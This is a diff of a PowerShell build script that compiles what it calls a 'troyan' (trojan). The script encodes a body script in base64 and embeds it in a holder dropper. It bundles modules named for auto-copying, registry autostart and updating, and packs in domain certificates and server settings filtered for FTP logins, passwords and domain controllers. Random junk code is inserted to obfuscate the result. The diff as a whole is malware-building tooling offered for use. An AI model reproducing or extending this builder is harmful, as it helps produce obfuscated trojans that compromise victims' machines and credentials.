@@ -68,6 +68,17 @@ if (-not [string]::IsNullOrEmpty($outPath))
         New-Item -Path $outPath  -ItemType Directory
     }
 }
+$outPath = $server.troyanOutputParts
+if (-not (Test-Path $outPath )) {
+    New-Item -Path $outPath  -ItemType Directory
+}
+if (-not [string]::IsNullOrEmpty($outPath)) 
+{
+    Remove-Item -Path $outPath\* -Recurse -Force
+    if (-not (Test-Path $outPath )) {
+        New-Item -Path $outPath  -ItemType Directory
+    }
+}
 
 function Utf8NoBom {
     param (
@@ -237,16 +248,53 @@ function Format-ArrayToString {
     return $result
 }
 
-function Make-Template { 
-    param ([string]$target, [bool]$short, [string]$selfTemplate)
+function Make-Template-Body { 
     $template = @"
     `$server = '_SERVER' | ConvertFrom-Json
 
 "@
-    if ($target -eq "holder")
+    $keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
+    $filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
+    $servStr = ($filteredObject | ConvertTo-Json)
+    $template  = $template -replace "_SERVER", $servStr
+    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_body.ps1")
+
+    return $template
+}
+
+function Make-Template-Holder { 
+    param ([string]$target, [bool]$withBody, [bool]$withSelf, [string]$selfTemplate)
+    $template = Make-Template-Body
+
+    if ($withBody -eq $true)
     {
         $template += @"
+
         `$xbody = "__BODY"
+"@
+        $body = Encode-FileToBase64 -inFile $server.troyanBody
+        $template = $template -replace "__BODY", $body
+    }
+
+
+    if ($withSelf -eq $true)
+    {
+        $template += @"
+
+        `$xholder = "__SELF"
+
+"@
+        $template = $template -replace "__SELF", $selfTemplate
+    }
+
+    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_$target.ps1")
+    return $template
+}
+
+function Make-Template-Embeddings { 
+
+    $template=""
+        $template += @"
         `$xfront = @(
         _FRONT_X
         )
@@ -259,67 +307,50 @@ function Make-Template {
         `$xembed_name = @(
         _EMBED_NAME
         )
-
 "@
-        if ($short -eq $false)
-        {
-            $template += @"
-            `$xholder = "__SELF"
-"@
-        }
-        $body = Encode-FileToBase64 -inFile $server.troyanBody
-        $template = $template -replace "__BODY", $body
         ($name, $data) = Create-EmbeddingFiles -name "front"
         $template = $template -replace "_FRONT_X", $data
         $template = $template -replace "_FRONT_NAME", $name
         ($name, $data) = Create-EmbeddingFiles -name "embeddings"
         $template = $template -replace "_EMBED_X", $data
         $template = $template -replace "_EMBED_NAME", $name
-        if ($short -eq $false)
-        {
-            $template = $template -replace "__SELF", $selfTemplate
-        }
-    }
+        $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_embeddings.ps1")
+}
 
-    if ($target -eq "body")
-    {
+function Make-Template-Cert {
+        $template = ""
         $template += @"
+
         `$xdata = @{
         _CERT
     }
+        
 "@
-        $stringList = @()
-        foreach ($domain in $server.domains) 
-        {
+    $stringList = @()
+    foreach ($domain in $server.domains) 
+    {
 
-            $pathPfx = pfxFile($domain)
-            if ([string]::IsNullOrEmpty($pathPfx)) {
-                throw "The certficiate is not found for domain: $domain"
-            }
-            $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
-            $base64 = [Convert]::ToBase64String($binaryData)
-            $chunkSize = 200
-            $chunks = @()
-            for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
-                $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
-                $chunks += $chunk
-            }
-            $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
-            $stringList += "'" + $domain + "'=" + $code
+        $pathPfx = pfxFile($domain)
+        if ([string]::IsNullOrEmpty($pathPfx)) {
+            throw "The certficiate is not found for domain: $domain"
         }
-
-        $listString = $stringList -join [System.Environment]::NewLine
-        $template  = $template -replace "_CERT", $listString    
+        $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
+        $base64 = [Convert]::ToBase64String($binaryData)
+        $chunkSize = 200
+        $chunks = @()
+        for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
+            $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
+            $chunks += $chunk
+        }
+        $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
+        $stringList += "'" + $domain + "'=" + $code
     }
 
-    $keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
-    $filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
-    $servStr = ($filteredObject | ConvertTo-Json)
-    $template  = $template -replace "_SERVER", $servStr
-    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_$target.ps1")
+    $listString = $stringList -join [System.Environment]::NewLine
+    $template  = $template -replace "_CERT", $listString    
+    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_cert.ps1")
+} 
 
-    return $template
-}
 
 function Make-Ps1Files {
     param ([string]$target)
@@ -329,9 +360,12 @@ function Make-Ps1Files {
     
     $holderFiles = @()
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_holder.ps1") }
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_embeddings.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("autocopy.ps1", "autoregistry.ps1", "embeddings.ps1", "update.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("holder.ps1") }
+
+    $holderPartsFiles = $allFiles | Where-Object { $_.Name -in @("holder_parts.ps1") }
 
     if ($target -eq "holder")
     {
@@ -340,10 +374,12 @@ function Make-Ps1Files {
 
     if ($target -eq "body") {
         $holderFileNames = $holderFiles.Name
+        $holderPartsFileNames = $holderPartsFiles.Name
         $returnFiles = @()
         $returnFiles += $allFiles | Where-Object { $_.Name -in @("consts_body.ps1") }
+        $returnFiles += $allFiles | Where-Object { $_.Name -in @("consts_cert.ps1") }
         $returnFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
-        $returnFiles += $allFiles | Where-Object { $_.Name -notin $holderFileNames -and $_.Name -notin @("utils.ps1") -and $_.Name -notin @("program.ps1")  -and $_.Name -notin @("consts_body.ps1")  }
+        $returnFiles += $allFiles | Where-Object { $_.Name -notin $holderPartsFileNames -and  $_.Name -notin $holderFileNames -and $_.Name -notin @("utils.ps1") -and $_.Name -notin @("program.ps1")  -and $_.Name -notin @("consts_body.ps1")   -and $_.Name -notin @("consts_cert.ps1") }
         $returnFiles += $allFiles | Where-Object { $_.Name -in @("program.ps1")}
     }
 
@@ -352,7 +388,7 @@ function Make-Ps1Files {
 
 function BuldScript{
     param (
-       [string]$template, [array]$files, [string]$outputFile, [bool]$random)
+       [array]$files, [string]$outputFile, [bool]$random)
 
         $pref = '
         # $generalJob = Start-Job -ScriptBlock {
@@ -383,11 +419,14 @@ function BuldScript{
         $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_body.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_holder.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts_embeddings.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts_cert.ps1', "`n`n"
         if ($random -eq $true)
         {
             $joinedContent += Generate-RandomCode
         }
-        $joinedContent += $fileContent + [System.Environment]::NewLine
+        $fn = $file.Name
+        $joinedContent += "`n`n" + "# $fn" + "`n`n" + $fileContent + [System.Environment]::NewLine
     }
     if ($random -eq $true)
     {
@@ -401,26 +440,89 @@ function BuldScript{
     Utf8NoBom -data $joinedContent -file $outputFile
 }
 
-$template = Make-Template -target "body" -short $false -selfTemplate ""
+Make-Template-Body
+Make-Template-Embeddings
+Make-Template-Cert
+
+
 $files = Make-Ps1Files -target "body"
-BuldScript -template $template -files $files -outputFile $server.troyanBody -random $true
-BuldScript -template $template -files $files -outputFile $server.troyanBodyClean -random $false
+BuldScript -files $files -outputFile $server.troyanBody -random $true
+BuldScript -files $files -outputFile $server.troyanBodyClean -random $false
 $encoded = Encode-FileToBase64 -inFile $server.troyanBody
 Utf8NoBom -data $encoded -file $server.userTroyanBody
 
-$template = Make-Template -target "holder" -short $true -selfTemplate ""
+Make-Template-Holder -target "holder" -withBody $true -withSelf $false -selfTemplate ""
 $files = Make-Ps1Files -target "holder"
-BuldScript -template $template -files $files -outputFile $server.troyanHolder -random $true
-BuldScript -template $template -files $files -outputFile $server.troyanHolderClean -random $false
-$encoded = Encode-FileToBase64 -inFile $server.troyanHolder
+BuldScript -files $files -outputFile $server.troyanHolder -random $true
+BuldScript -files $files -outputFile $server.troyanHolderClean -random $false
+$holderBase = Encode-FileToBase64 -inFile $server.troyanHolder
 
-$template = Make-Template -target "holder" -short $false -selfTemplate $encoded
+Make-Template-Holder -target "holder" -withBody $true -withSelf $true -selfTemplate $holderBase
 $files = Make-Ps1Files -target "holder"
-BuldScript -template $template -files $files -outputFile $server.troyanHolder -random $true
-BuldScript -template $template -files $files -outputFile $server.troyanHolderClean -random $false
+BuldScript -files $files -outputFile $server.troyanHolder -random $true
+BuldScript -files $files -outputFile $server.troyanHolderClean -random $false
 $encoded = Encode-FileToBase64 -inFile $server.troyanHolder
 Utf8NoBom -data $encoded -file $server.userTroyanHolder
 
+##
 
+
+
+function BuldScriptParts{
+       function get{
+        param ([string]$name)
+      
+        $fn =Join-Path -Path $server.troyanScriptDir -ChildPath $name
+        $data=""
+        #$data += (Generate-RandomCode)
+        $data += GetUtfNoBom -file $fn
+        return  "`n`n" + "# $name" + "`n`n" + $data
+       }
+
+       $pref = '
+       # $generalJob = Start-Job -ScriptBlock {
+
+           function writedbg2 {
+                   param (
+                       [string]$msg,   [string]$msg2=""
+                   )
+               }
+               '
+
+       $suff = '
+   #    }
+   # Wait-Job -Job $generalJob
+   # Receive-Job -Job $generalJob
+   # Remove-Job -Job $generalJob
+       ';
+
+    $utils = get -name "utils.ps1"
+    $consts_body = get -name "consts_body.ps1"
+    $consts_holder = get -name "consts_holder_parts.ps1"
+    $consts_embeddings = get -name "consts_embeddings.ps1"
+    $consts_cert = get -name "consts_cert.ps1"
+
+    $files = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
+
+    foreach ($file in $files) {
+        $fn = $file.Name
+        $fileContent = $pref
+        $fileContent += get -name $fn
+        $fileContent = $fileContent -replace '. ./utils.ps1', $utils
+        $fileContent = $fileContent -replace '. ./consts_body.ps1', $consts_body
+        $fileContent = $fileContent -replace '. ./consts_holder.ps1', $consts_holder
+        $fileContent = $fileContent -replace '. ./consts_embeddings.ps1', $consts_embeddings
+        $fileContent = $fileContent -replace '. ./consts_cert.ps1', $consts_cert
+        $fileContent += $suff    
+        $outFile = Join-Path -Path $server.troyanOutputParts -ChildPath $fn
+        Utf8NoBom -data $fileContent -file $outFile
+    }
+}
+
+
+Make-Template-Holder -target "holder_parts" -withBody $false -withSelf $false -selfTemplate $holderBase
+BuldScriptParts
+Copy-Item -Path (Join-Path -Path $server.troyanOutputParts -ChildPath "holder_parts.ps1") -Destination $server.troyanHolderParts -Force
+Copy-Item -Path (Join-Path -Path $server.troyanOutputParts -ChildPath "holder_parts.ps1") -Destination $server.userTroyanHolderParts -Force
 
 Write-Host "Troyan Compile complete"
